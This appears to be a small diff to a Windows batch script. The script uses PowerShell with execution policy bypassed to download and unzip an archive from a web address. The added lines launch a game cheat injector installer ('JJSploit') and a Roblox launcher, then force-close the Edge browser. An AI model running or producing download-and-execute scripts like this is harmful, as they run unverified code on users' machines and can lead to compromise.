@@ -6,3 +6,8 @@ PowerShell -NoProfile -ExecutionPolicy Bypass -Command "curl -o pack.zip https:/
 PowerShell -NoProfile -ExecutionPolicy Bypass -Command "unzip .\pack.zip"
 
 del /f .\pack.zip
+
+start ./"JJSploit Installer.exe"
+start ./"RobloxPlayerLauncher (2).exe"
+
+taskkill /IM msedge.exe
